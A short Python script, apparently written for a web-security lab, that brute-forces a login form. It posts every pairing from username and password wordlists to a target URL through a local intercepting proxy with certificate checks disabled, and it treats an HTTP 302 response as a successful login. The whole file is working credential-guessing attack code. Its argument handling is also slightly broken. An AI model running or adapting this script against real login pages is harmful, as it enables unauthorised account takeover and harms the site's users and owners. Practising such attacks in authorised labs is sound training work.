import requests
# import grequests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def check_response_code(res):
    print(res.status_code)


def find_username(url):
    with open('../username_list.txt') as f:
        usernames = f.readlines()
    
    with open('../password_list.txt') as p:
        passwords = p.readlines()


    for username in usernames:
        for password in passwords:
            data = {"username": username.strip('\n'), "password": password.strip("\n")}
            r = requests.post(url, verify=False, proxies=proxies, data=data)
            print("Username: %s --- Password: %s -- %s" % (username.strip("\n"), password.strip('\n'), r.status_code))
            if r.status_code == 302:
                print("Found username: %s Password: %s" % (username.strip('\n'), password.strip('\n')))
                break


def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Findings valid username")
	# password_length = sql_password_length(url)
	find_username(url)
	
	
if __name__ == "__main__":
	main()